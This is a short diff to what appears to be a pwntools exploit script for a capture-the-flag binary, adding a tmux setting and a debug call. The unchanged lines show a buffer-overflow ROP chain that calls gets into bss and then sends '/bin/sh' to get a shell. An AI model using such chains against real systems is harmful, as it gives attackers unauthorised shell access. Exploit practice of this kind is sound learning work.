@@ -1,7 +1,7 @@
 from pwn import *
 
 context.log_level = 'debug'
-#context.terminal = ["/usr/bin/tmux", "sp", "-h"]
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
 
 f_remote = True if "remote" in sys.argv else False
 f_gdb = True if "gdb" in sys.argv else False
@@ -43,6 +43,7 @@ vuln = 0x400647
 payload = b"a" * 0x40 + p64(0)
 payload += p64(pop_rdi) + p64(bss) + p64(gets_plt)
 payload += p64(vuln)
+ddebug("")
 io.sendlineafter("our program: ", payload)
 
 payload = b"/bin/sh\x00"
